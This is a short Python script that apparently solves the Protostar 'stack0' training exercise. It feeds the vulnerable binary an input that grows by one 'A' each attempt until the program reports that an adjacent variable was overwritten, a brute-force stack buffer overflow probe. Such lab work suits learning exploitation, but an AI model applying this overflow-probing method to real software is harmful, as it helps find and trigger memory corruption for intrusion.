#!/usr/bin/python

import commands
import re

file = open('buffer', 'w+')
file.close()

#string = 'A'*32 + '\n'
#file.write(string)

command = '/opt/protostar/bin/stack0'
line = command + " < buffer"

modified = 0
count = 0

while (modified == 0):
	file = open('buffer', 'a')
	file.write('A')
	file.close()
	count = count + 1
	print('Attempting ' + str(count) + '\n')

	output = commands.getoutput(line)
	#print(output)

	match = re.search( r'modified', output, re.I)

	if match:
		print('Variable modified at ' + str(count))
		modified = 1
